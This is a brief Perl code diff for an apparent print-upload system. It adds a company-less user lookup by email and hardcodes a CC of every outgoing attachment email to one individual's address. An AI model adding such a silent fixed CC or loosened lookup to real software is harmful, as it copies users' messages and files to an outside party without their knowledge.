@@ -304,6 +304,11 @@ EOT
 		if ( my @Users = openprint::User::find('company_id'=>$Company->id(), 'email'=>lc $upload_info->{user}) ) {
 			$User = $Users[0];
 		} # end if
+	} else {
+		if ( my @Users = openprint::User::find('email'=>lc $upload_info->{user}) ) {
+			$User = $Users[0];
+			$Company = $User->Company();
+		} # end if
 	} # end if
 
 	if ( $Company and $User ) {
@@ -338,6 +343,7 @@ EOT
                         SMTP    => $config{'Mail Server'},
                         FROM    => $from,
                         TO      => $to,
+						CC		=>	'iconnor@penultima.org',
                         SUBJECT => $subject,
                    );
         misc::send_email_with_attachment( $log, \%mail, ( '', encode_qp($body), 'text/html', 'quoted-printable' ) );
